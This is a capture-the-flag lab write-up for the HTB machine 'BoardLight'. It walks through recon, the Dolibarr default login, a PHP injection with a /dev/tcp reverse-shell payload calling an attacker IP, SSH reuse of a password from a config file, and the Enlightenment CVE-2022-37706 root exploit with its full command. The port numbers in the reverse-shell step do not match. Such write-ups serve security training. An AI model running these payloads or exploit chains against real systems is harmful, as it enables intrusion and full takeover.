## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- **Exploits Used**:
  - Default Dolibarr credentials 🆔  
  - PHP code injection via **CVE-2023-30253** 🔓  
  - SSH login with config‐extracted creds 🔑  
  - Local root via **CVE-2022-37706** (Enlightenment WM) 👑  

---

## 🕵️ Recon

```bash
nmap -p- --min-rate 10000 10.10.11.11 -oA boardlight
```

```bash
nmap -p 22,80 -sCV 10.10.11.11 -oA boardlight-scv
```

- **[SSH](SSH)** (22)  
- **[HTTP](HTTP)** (80) → Apache 2.4.41 on Ubuntu  
- Webroot hosts **Dolibarr v17.0.0** at `crm.board.htb`

# Directory / subdomain fuzzing
```bash
feroxbuster -u http://10.10.11.11 -x php
```

```bash
ffuf -u http://10.10.11.11 -H "Host: FUZZ.board.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all
```
### → found crm.board.htb
---

## 1) 💥 Foothold as www‑data

### 1. Login to Dolibarr CRM

- Browse to http://crm.board.htb/
- **Default creds**: `admin` / `admin`

### 2. Identify PHP injection (CVE-2023-30253)

- Create a new **Website → Page**  
- Save content containing `<?Php phpinfo(); ?>`  
- “Show dynamic content” toggle must be enabled to execute

### 3. Get reverse shell

```php
<?Php system('bash -i >& /dev/tcp/10.10.14.13/6969 0>&1'); ?>
```

- Save & preview → shell lands as `www-data` on port 443  

```bash
# Upgrade shell
script /dev/null -c bash
```

---

## 2) Foothold as www‑data [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

# On our local machine
```

nc -lvnp 9001
```

# On the victim machine
```

python3 exploit.py http://crm.board.htb admin admin 10.10.14.28 9001
```

## 🐚 Pivot as larissa

### 1. Dolibarr config reveals DB creds

### /var/www/html/crm.board.htb/htdocs/conf/conf.php
```php
$dolibarr_main_db_user = 'dolibarrowner';
$dolibarr_main_db_pass = 'serverfun2$2023!!';
```

### 2. SSH as larissa

```bash
sshpass -p 'serverfun2$2023!!' ssh larissa@board.htb
```

- **User flag**:

```bash
cat ~/user.txt
# cbcdd575************************
```

---

## 🚀 Privilege Escalation to root

### 1. Enumerate SUID binaries
#### /usr/lib/.../enlightenment_sys (setuid root)

```bash
find / -perm -4000 2>/dev/null | grep enlightenment_sys
```

### 2. Exploit CVE-2022-37706

```bash
# Prepare payload
mkdir -p /tmp/net
mkdir -p "/tmp/;/tmp/infinit3i"
echo "/bin/bash" > /tmp/infinit3i
chmod +x /tmp/infinit3i
```
# Trigger command injection
```bash
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/infinit3i" /tmp///net
```

---

## 🛠 Tools & References

- **SMB & SSH**: `nmap`, `sshpass`, `feroxbuster`, `ffuf`  
- **Dolibarr**: Default creds + page editor  
- **CVE-2023-30253**: PHP injection in Dolibarr → [Swascan writeup](https://swascan.com/blog-dolibarr-vulnerabilities/)  
- **CVE-2022-37706**: Enlightenment WM → [GitHub POC](https://github.com/phra/Enlightenment-CVE-2022-37706-poc)  